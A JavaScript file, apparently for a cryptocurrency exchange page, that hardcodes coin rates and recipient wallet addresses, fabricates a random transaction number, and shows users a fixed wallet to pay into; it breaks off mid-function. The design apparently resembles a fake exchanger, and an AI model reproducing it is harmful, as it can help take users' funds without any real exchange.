// курс валют
const bitcoinCourse = 20340.65
const ethereumCourse = 1503.47
const tetherCourse = 0.999
const cardanoCourse = 0.4313
const dogecoinCourse = 0.06134
const tronCourse = 0.06105
const shibainuCourse = 0.00001121
const litecoinCourse = 53.53
const terraclassicCourse = 0.0003003
const chilizCourse = 0.2446

// название монет
const noneName = 'Ничего не выбрано'
const bitcoinName = 'Bitcoin BTC'
const ethereumName = 'Ethereum ETH'
const tetherName = 'Tether USDT'
const cardanoName = 'Cardano ADA'
const dogecoinName = 'Dogecoin DOGE'
const tronName = 'TRON TRX'
const shibainuName = 'Shiba Inu SHIB'
const litecoinName = 'Litecoin LTC'
const terraclassicName = 'Terra Classic LUNC'
const chilizName = 'Chiliz CHZ'

// кошельки получателя
const bitcoinWallet = '*кошелек bitcoin* - ведутся технические работы'
const ethereumWallet = '0xa01860cC78B0a89DC5B5cB956a136d5bc934AAAB (ETH)'
const tetherWallet = 'TQZiKaCxmJVyaPSZob7U2cfoheUb84NFyv (TRC20)'
const cardanoWallet = '0xa01860cC78B0a89DC5B5cB956a136d5bc934AAAB (BEP20)BSC'
const dogecoinWallet = '0xa01860cC78B0a89DC5B5cB956a136d5bc934AAAB (BEP20)BSC' 
const tronWallet = 'TQZiKaCxmJVyaPSZob7U2cfoheUb84NFyv (TRON)'
const shibainuWallet = '0xa01860cC78B0a89DC5B5cB956a136d5bc934AAAB (BEP20)BSC'
const litecoinWallet = '0xa01860cC78B0a89DC5B5cB956a136d5bc934AAAB (BEP20)BSC'
const terraclassicWallet = '*кошелек Terra Classic* - ведутся технические работы'
const chilizWallet = '0xa01860cC78B0a89DC5B5cB956a136d5bc934AAAB (BEP20)DSC'

// реагирует на выбор монет
$(document).ready(() => {
    $('#coinsOptions > .option').on('click', function (event) {
        console.log($(this).data('coin'))
    })
    $('#coinsOptions1 > .option1').on('click', function (event) {
        console.log($(this).data('coin'))
    })
})

// перекидывание данных дальше, дубль 2, вроде работает
$(document).ready(() => {
    $('#startTransaction').on('click', () => {
        let chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        let transactionNumberLength = 30
        let transactionNumber = ''

        for (var i = 0; i < transactionNumberLength; i++) {
            var randomNumber = Math.floor(Math.random() * chars.length);
            transactionNumber += chars.substring(randomNumber, randomNumber+1)
        }
        let transaction = transactionNumber
    
        let amountValue = $('#input1').val()
        let mailValue = $('#inputEmail').val()
        let wallet1Value = $('#inputWallet').val()

        let wallet2Value = ''
        if (($('#selectCoin1').text() == bitcoinName)) {
            wallet2Value = bitcoinWallet
        } else if (($('#selectCoin1').text() == ethereumName)) {
            wallet2Value = ethereumWallet
        } else if (($('#selectCoin1').text() == tetherName)) {
            wallet2Value = tetherWallet
        } else if (($('#selectCoin1').text() == cardanoName)) {
            wallet2Value = cardanoWallet
        } else if (($('#selectCoin1').text() == dogecoinName)) {
            wallet2Value = dogecoinWallet
        } else if (($('#selectCoin1').text() == tronName)) {
            wallet2Value = tronWallet
        } else if (($('#selectCoin1').text() == shibainuName)) {
            wallet2Value = shibainuWallet
        } else if (($('#selectCoin1').text() == litecoinName)) {
            wallet2Value = litecoinWallet
        } else if (($('#selectCoin1').text() == terraclassicName)) {
            wallet2Value = terraclassicWallet
        } else if (($('#selectCoin1').text() == chilizName)) {
            wallet2Value = chilizWallet
        } else if (($('#selectCoin1').text() == noneName)) {
            wallet2Value = ''
        } else {
            alert('error')
        }

        function deleteElements() {
            document.getElementById('select-menu').style.display = 'none'
            document.getElementById('select-menu1').style.display = 'none'
            document.getElementById('form_group1').style.display = 'none'
            document.getElementById('form_group2').style.display = 'none'
            document.getElementById('startTransaction').style.display = 'none'
        }
        deleteElements()

        function addElements() {
            document.getElementById('completeP').style.display = 'block'
            document.getElementById('transactionP').style.display = 'block'
            document.getElementById('amountP').style.display = 'block'
            document.getElementById('mailP').style.display = 'block'
            document.getElementById('comissionP').style.display = 'block'
            document.getElementById('walletP1').style.display = 'block'
            document.getElementById('walletP2').style.display = 'block'
            document.getElementById('pleaseP').style.display = 'block'
            document.getElementById('pleaseP2').style.display = 'block'
            document.getElementById('pleaseP3').style.display = 'block'
        } 
        addElements()

        function addValToElements () {
            document.getElementById('transactionNumber').value = transaction
            document.getElementById('transactionMoney').value = `${amountValue} ${$('#selectCoin1').text()}`
            document.getElementById('transactionEmail').value = mailValue
            document.getElementById('transactionWallet1').value = wallet1Value
            document.getElementById('transactionWallet2').value = wallet2Value
            document.getElementById('transactionAmountPlease').value = `${amountValue} ${$('#selectCoin1').text()} На кошелек:`
            document.getElementById('transactionWalletPlease').value = wallet2Value
        }
        addValToElements()

    })
})

// калькулятор
$(document).ready(() => {
        function input2Val() {
            let inputVal = $('#input2').val()
            inputVal = parseInt(inputVal * 100) / 100
            // inputVal = inputVal.replace(/,/g, '.')
            $('#input2').val(inputVal)
            console.log($('#input2').val(inputVal))
        }

        function input1Val() {
            let inputVal = $('#input1').val()
            inputVal = parseInt(inputVal * 100) / 100   
            // inputVal = inputVal.replace(/,/g, '.')
            $('#input1').val(inputVal)
            console.log($('#input1').val(inputVal))
        }

        // let arrCourses = [
        //     bitcoinCourse,
        //     ethereumCourse,
        //     tetherCourse,
        //     cardanoCourse,
        //     dogecoinCourse,
        //     tronCourse,
        //     shibainuCourse,
        //     litecoinCourse,
        //     terraclassicCourse,
        //     chilizCourse
        // ]

        // let arrCoinNames = [
        //     bitcoinName,
        //     ethereumName,
        //     tetherName,
        //     cardanoName,
        //     dogecoinName,
        //     tronName,
        //     shibainuName,
        //     litecoinName,
        //     terraclassicName,
        //     chilizName
        // ]

    $('#input1').on('input', function () {
        if ($('#selectCoin1').text() == bitcoinName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('bitcoinName - bitcoinName')
                $('#input2').val($('#input1').val())
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('bitcoinName - ethereumName')
                $('#input2').val($('#input1').val() * bitcoinCourse * Math.fround(1 / ethereumCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('bitcoinName - tetherName')
                $('#input2').val($('#input1').val() * bitcoinCourse * Math.fround(1 / tetherCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('bitcoinName - cardanoName')
                $('#input2').val($('#input1').val() * bitcoinCourse * Math.fround(1 / cardanoCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('bitcoinName - dogecoinName')
                $('#input2').val($('#input1').val() * bitcoinCourse * Math.fround(1 / dogecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('bitcoinName - tronName')
                $('#input2').val($('#input1').val() * bitcoinCourse * Math.fround(1 / tronCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('bitcoinName - shibainuName')
                $('#input2').val($('#input1').val() * bitcoinCourse * Math.fround(1 / shibainuCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('bitcoinName - litecoinName')
                $('#input2').val($('#input1').val() * bitcoinCourse * Math.fround(1 / litecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('bitcoinName - terraclassicName')
                $('#input2').val($('#input1').val() * bitcoinCourse * Math.fround(1 / terraclassicCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('bitcoinName - chilizName')
                $('#input2').val($('#input1').val() * bitcoinCourse * Math.fround(1 / chilizCourse))
                input2Val()
            }
        } else if ($('#selectCoin1').text() == ethereumName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('ethereumName - bitcoinName')
                $('#input2').val($('#input1').val() * ethereumCourse * Math.fround(1 / bitcoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('ethereumName - ethereumName')
                $('#input2').val($('#input1').val())
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('ethereumName - tetherName')
                $('#input2').val($('#input1').val() * ethereumCourse * Math.fround(1 / tetherCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('ethereumName - cardanoName')
                $('#input2').val($('#input1').val() * ethereumCourse * Math.fround(1 / cardanoCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('ethereumName - dogecoinName')
                $('#input2').val($('#input1').val() * ethereumCourse * Math.fround(1 / dogecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('ethereumName - tronName')
                $('#input2').val($('#input1').val() * ethereumCourse * Math.fround(1 / tronCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('ethereumName - shibainuName')
                $('#input2').val($('#input1').val() * ethereumCourse * Math.fround(1 / shibainuCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('ethereumName - litecoinName')
                $('#input2').val($('#input1').val() * ethereumCourse * Math.fround(1 / litecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('ethereumName - terraclassicName')
                $('#input2').val($('#input1').val() * ethereumCourse * Math.fround(1 / terraclassicCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('ethereumName - chilizName')
                $('#input2').val($('#input1').val() * ethereumCourse * Math.fround(1 / chilizCourse))
                input2Val()
            }
        } else if ($('#selectCoin1').text() == tetherName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('tetherName - bitcoinName')
                $('#input2').val($('#input1').val() * tetherCourse * Math.fround(1 / bitcoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('tetherName - ethereumName')
                $('#input2').val($('#input1').val() * tetherCourse * Math.fround(1 / ethereumCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('tetherName - tetherName')
                $('#input2').val($('#input1').val())
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('tetherName - cardanoName')
                $('#input2').val($('#input1').val() * tetherCourse * Math.fround(1 / cardanoCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('tetherName - dogecoinName')
                $('#input2').val($('#input1').val() * tetherCourse * Math.fround(1 / dogecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('tetherName - tronName')
                $('#input2').val($('#input1').val() * tetherCourse * Math.fround(1 / tronCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('tetherName - shibainuName')
                $('#input2').val($('#input1').val() * tetherCourse * Math.fround(1 / shibainuCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('tetherName - litecoinName')
                $('#input2').val($('#input1').val() * tetherCourse * Math.fround(1 / litecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('tetherName - terraclassicName')
                $('#input2').val($('#input1').val() * tetherCourse * Math.fround(1 / terraclassicCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('tetherName - chilizName')
                $('#input2').val($('#input1').val() * tetherCourse * Math.fround(1 / chilizCourse))
                input2Val()
            }
        } else if ($('#selectCoin1').text() == cardanoName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('cardanoName - bitcoinName')
                $('#input2').val($('#input1').val() * cardanoCourse * Math.fround(1 / bitcoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('cardanoName - ethereumName')
                $('#input2').val($('#input1').val() * cardanoCourse * Math.fround(1 / ethereumCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('cardanoName - tetherName')
                $('#input2').val($('#input1').val() * cardanoCourse * Math.fround(1 / tetherCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('cardanoName - cardanoName')
                $('#input2').val($('#input1').val())
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('cardanoName - dogecoinName')
                $('#input2').val($('#input1').val() * cardanoCourse * Math.fround(1 / dogecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('cardanoName - tronName')
                $('#input2').val($('#input1').val() * cardanoCourse * Math.fround(1 / tronCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('cardanoName - shibainuName')
                $('#input2').val($('#input1').val() * cardanoCourse * Math.fround(1 / shibainuCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('cardanoName - litecoinName')
                $('#input2').val($('#input1').val() * cardanoCourse * Math.fround(1 / litecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('cardanoName - terraclassicName')
                $('#input2').val($('#input1').val() * cardanoCourse * Math.fround(1 / terraclassicCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('cardanoName - chilizName')
                $('#input2').val($('#input1').val() * cardanoCourse * Math.fround(1 / chilizCourse))
                input2Val()
            }
        } else if ($('#selectCoin1').text() == dogecoinName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('dogecoinName - bitcoinName')
                $('#input2').val($('#input1').val() * dogecoinCourse * Math.fround(1 / bitcoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('dogecoinName - ethereumName')
                $('#input2').val($('#input1').val() * dogecoinCourse * Math.fround(1 / ethereumCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('dogecoinName - tetherName')
                $('#input2').val($('#input1').val() * dogecoinCourse * Math.fround(1 / tetherCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('dogecoinName - cardanoName')
                $('#input2').val($('#input1').val() * dogecoinCourse * Math.fround(1 / cardanoCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('dogecoinName - dogecoinName')
                $('#input2').val($('#input1').val())
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('dogecoinName - tronName')
                $('#input2').val($('#input1').val() * dogecoinCourse * Math.fround(1 / tronCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('dogecoinName - shibainuName')
                $('#input2').val($('#input1').val() * dogecoinCourse * Math.fround(1 / shibainuCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('dogecoinName - litecoinName')
                $('#input2').val($('#input1').val() * dogecoinCourse * Math.fround(1 / litecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('dogecoinName - terraclassicName')
                $('#input2').val($('#input1').val() * dogecoinCourse * Math.fround(1 / terraclassicCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('dogecoinName - chilizName')
                $('#input2').val($('#input1').val() * dogecoinCourse * Math.fround(1 / chilizCourse))
                input2Val()
            }
        } else if ($('#selectCoin1').text() == tronName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('tronName - bitcoinName')
                $('#input2').val($('#input1').val() * tronCourse * Math.fround(1 / bitcoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('tronName - ethereumName')
                $('#input2').val($('#input1').val() * tronCourse * Math.fround(1 / ethereumCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('tronName - tetherName')
                $('#input2').val($('#input1').val() * tronCourse * Math.fround(1 / tetherCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('tronName - cardanoName')
                $('#input2').val($('#input1').val() * tronCourse * Math.fround(1 / cardanoCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('tronName - dogecoinName')
                $('#input2').val($('#input1').val() * tronCourse * Math.fround(1 / dogecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('tronName - tronName')
                $('#input2').val($('#input1').val())
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('tronName - shibainuName')
                $('#input2').val($('#input1').val() * tronCourse * Math.fround(1 / shibainuCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('tronName - litecoinName')
                $('#input2').val($('#input1').val() * tronCourse * Math.fround(1 / litecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('tronName - terraclassicName')
                $('#input2').val($('#input1').val() * tronCourse * Math.fround(1 / terraclassicCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('tronName - chilizName')
                $('#input2').val($('#input1').val() * tronCourse * Math.fround(1 / chilizCourse))
                input2Val()
            }
        } else if ($('#selectCoin1').text() == shibainuName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('shibainuName - bitcoinName')
                $('#input2').val($('#input1').val() * shibainuCourse * Math.fround(1 / bitcoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('shibainuName - ethereumName')
                $('#input2').val($('#input1').val() * shibainuCourse * Math.fround(1 / ethereumCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('shibainuName - tetherName')
                $('#input2').val($('#input1').val() * shibainuCourse * Math.fround(1 / tetherCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('shibainuName - cardanoName')
                $('#input2').val($('#input1').val() * shibainuCourse * Math.fround(1 / cardanoCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('shibainuName - dogecoinName')
                $('#input2').val($('#input1').val() * shibainuCourse * Math.fround(1 / dogecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('shibainuName - tronName')
                $('#input2').val($('#input1').val() * shibainuCourse * Math.fround(1 / tronCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('shibainuName - shibainuName')
                $('#input2').val($('#input1').val())
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('shibainuName - litecoinName')
                $('#input2').val($('#input1').val() * shibainuCourse * Math.fround(1 / litecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('shibainuName - terraclassicName')
                $('#input2').val($('#input1').val() * shibainuCourse * Math.fround(1 / terraclassicCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('shibainuName - chilizName')
                $('#input2').val($('#input1').val() * shibainuCourse * Math.fround(1 / chilizCourse))
                input2Val()
            }
        } else if ($('#selectCoin1').text() == litecoinName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('litecoinName - bitcoinName')
                $('#input2').val($('#input1').val() * litecoinCourse * Math.fround(1 / bitcoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('litecoinName - ethereumName')
                $('#input2').val($('#input1').val() * litecoinCourse * Math.fround(1 / ethereumCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('litecoinName - tetherName')
                $('#input2').val($('#input1').val() * litecoinCourse * Math.fround(1 / tetherCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('litecoinName - cardanoName')
                $('#input2').val($('#input1').val() * litecoinCourse * Math.fround(1 / cardanoCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('litecoinName - dogecoinName')
                $('#input2').val($('#input1').val() * litecoinCourse * Math.fround(1 / dogecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('litecoinName - tronName')
                $('#input2').val($('#input1').val() * litecoinCourse * Math.fround(1 / tronCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('litecoinName - shibainuName')
                $('#input2').val($('#input1').val() * litecoinCourse * Math.fround(1 / shibainuCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('litecoinName - litecoinName')
                $('#input2').val($('#input1').val())
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('litecoinName - terraclassicName')
                $('#input2').val($('#input1').val() * litecoinCourse * Math.fround(1 / terraclassicCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('litecoinName - chilizName')
                $('#input2').val($('#input1').val() * litecoinCourse * Math.fround(1 / chilizCourse))
                input2Val()
            }
        } else if ($('#selectCoin1').text() == terraclassicName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('terraclassicName - bitcoinName')
                $('#input2').val($('#input1').val() * terraclassicCourse * Math.fround(1 / bitcoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('terraclassicName - ethereumName')
                $('#input2').val($('#input1').val() * terraclassicCourse * Math.fround(1 / ethereumCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('terraclassicName - tetherName')
                $('#input2').val($('#input1').val() * terraclassicCourse * Math.fround(1 / tetherCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('terraclassicName - cardanoName')
                $('#input2').val($('#input1').val() * terraclassicCourse * Math.fround(1 / cardanoCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('terraclassicName - dogecoinName')
                $('#input2').val($('#input1').val() * terraclassicCourse * Math.fround(1 / dogecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('terraclassicName - tronName')
                $('#input2').val($('#input1').val() * terraclassicCourse * Math.fround(1 / tronCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('terraclassicName - shibainuName')
                $('#input2').val($('#input1').val() * terraclassicCourse * Math.fround(1 / shibainuCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('terraclassicName - litecoinName')
                $('#input2').val($('#input1').val() * terraclassicCourse * Math.fround(1 / litecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('terraclassicName - terraclassicName')
                $('#input2').val($('#input1').val())
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('terraclassicName - chilizName')
                $('#input2').val($('#input1').val() * terraclassicCourse * Math.fround(1 / chilizCourse))
                input2Val()
            }
        } else if ($('#selectCoin1').text() == chilizName) {
            if ($('#selectCoin2').text() == bitcoinName) {
                console.log('chilizName - bitcoinName')
                $('#input2').val($('#input1').val() * chilizCourse * Math.fround(1 / bitcoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == ethereumName) {
                console.log('chilizName - ethereumName')
                $('#input2').val($('#input1').val() * chilizCourse * Math.fround(1 / ethereumCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tetherName) {
                console.log('chilizName - tetherName')
                $('#input2').val($('#input1').val() * chilizCourse * Math.fround(1 / tetherCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == cardanoName) {
                console.log('chilizName - cardanoName')
                $('#input2').val($('#input1').val() * chilizCourse * Math.fround(1 / cardanoCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == dogecoinName) {
                console.log('chilizName - dogecoinName')
                $('#input2').val($('#input1').val() * chilizCourse * Math.fround(1 / dogecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == tronName) {
                console.log('chilizName - tronName')
                $('#input2').val($('#input1').val() * chilizCourse * Math.fround(1 / tronCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == shibainuName) {
                console.log('chilizName - shibainuName')
                $('#input2').val($('#input1').val() * chilizCourse * Math.fround(1 / shibainuCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == litecoinName) {
                console.log('chilizName - litecoinName')
                $('#input2').val($('#input1').val() * chilizCourse * Math.fround(1 / litecoinCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == terraclassicName) {
                console.log('chilizName - terraclassicName')
                $('#input2').val($('#input1').val() * chilizCourse * Math.fround(1 / terraclassicCourse))
                input2Val()
            } else if ($('#selectCoin2').text() == chilizName) {
                console.log('chilizName - chilizName')
                $('#input2').val($('#input1').val())
            }
        } else {
            console.log('error')
        }
    })

    $('#input2').on('input', function () {
        if ($('#selectCoin2').text() == bitcoinName) {
            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('bitcoinName - bitcoinName')
                $('#input1').val($('#input2').val())
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('bitcoinName - ethereumName')
                $('#input1').val($('#input2').val() * bitcoinCourse * Math.fround(1 / ethereumCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('bitcoinName - tetherName')
                $('#input1').val($('#input2').val() * bitcoinCourse * Math.fround(1 / tetherCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('bitcoinName - cardanoName')
                $('#input1').val($('#input2').val() * bitcoinCourse * Math.fround(1 / cardanoCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('bitcoinName - dogecoinName')
                $('#input1').val($('#input2').val() * bitcoinCourse * Math.fround(1 / dogecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('bitcoinName - tronName')
                $('#input1').val($('#input2').val() * bitcoinCourse * Math.fround(1 / tronCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('bitcoinName - shibainuName')
                $('#input1').val($('#input2').val() * bitcoinCourse * Math.fround(1 / shibainuCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('bitcoinName - litecoinName')
                $('#input1').val($('#input2').val() * bitcoinCourse * Math.fround(1 / litecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('bitcoinName - terraclassicName')
                $('#input1').val($('#input2').val() * bitcoinCourse * Math.fround(1 / terraclassicCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('bitcoinName - chilizName')
                $('#input1').val($('#input2').val() * bitcoinCourse * Math.fround(1 / chilizCourse))
                input1Val()
            }
        } else if ($('#selectCoin2').text() == ethereumName) {
            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('ethereumName - bitcoinName')
                $('#input1').val($('#input2').val() * ethereumCourse * Math.fround(1 / bitcoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('ethereumName - ethereumName')
                $('#input1').val($('#input2').val())
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('ethereumName - tetherName')
                $('#input1').val($('#input2').val() * ethereumCourse * Math.fround(1 / tetherCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('ethereumName - cardanoName')
                $('#input1').val($('#input2').val() * ethereumCourse * Math.fround(1 / cardanoCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('ethereumName - dogecoinName')
                $('#input1').val($('#input2').val() * ethereumCourse * Math.fround(1 / dogecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('ethereumName - tronName')
                $('#input1').val($('#input2').val() * ethereumCourse * Math.fround(1 / tronCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('ethereumName - shibainuName')
                $('#input1').val($('#input2').val() * ethereumCourse * Math.fround(1 / shibainuCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('ethereumName - litecoinName')
                $('#input1').val($('#input2').val() * ethereumCourse * Math.fround(1 / litecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('ethereumName - terraclassicName')
                $('#input1').val($('#input2').val() * ethereumCourse * Math.fround(1 / terraclassicCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('ethereumName - chilizName')
                $('#input1').val($('#input2').val() * ethereumCourse * Math.fround(1 / chilizCourse))
                input1Val()
            }
        } else if ($('#selectCoin2').text() == tetherName) {
            if ($('#selectCoin1').text() == bitcoinName) {
                console.log('tetherName - bitcoinName')
                $('#input1').val($('#input2').val() * tetherCourse * Math.fround(1 / bitcoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == ethereumName) {
                console.log('tetherName - ethereumName')
                $('#input1').val($('#input2').val() * tetherCourse * Math.fround(1 / ethereumCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tetherName) {
                console.log('tetherName - tetherName')
                $('#input1').val($('#input2').val())
            } else if ($('#selectCoin1').text() == cardanoName) {
                console.log('tetherName - cardanoName')
                $('#input1').val($('#input2').val() * tetherCourse * Math.fround(1 / cardanoCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == dogecoinName) {
                console.log('tetherName - dogecoinName')
                $('#input1').val($('#input2').val() * tetherCourse * Math.fround(1 / dogecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == tronName) {
                console.log('tetherName - tronName')
                $('#input1').val($('#input2').val() * tetherCourse * Math.fround(1 / tronCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == shibainuName) {
                console.log('tetherName - shibainuName')
                $('#input1').val($('#input2').val() * tetherCourse * Math.fround(1 / shibainuCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == litecoinName) {
                console.log('tetherName - litecoinName')
                $('#input1').val($('#input2').val() * tetherCourse * Math.fround(1 / litecoinCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == terraclassicName) {
                console.log('tetherName - terraclassicName')
                $('#input1').val($('#input2').val() * tetherCourse * Math.fround(1 / terraclassicCourse))
                input1Val()
            } else if ($('#selectCoin1').text() == chilizName) {
                console.log('tetherName - chilizName')
                $('#input1').val($('#input2').val() * tetherCourse * Math.fround(1 / chilizCourse))
                input1Val()
            }
        } else if ($('#selectCoin2').text() == cardanoName) {
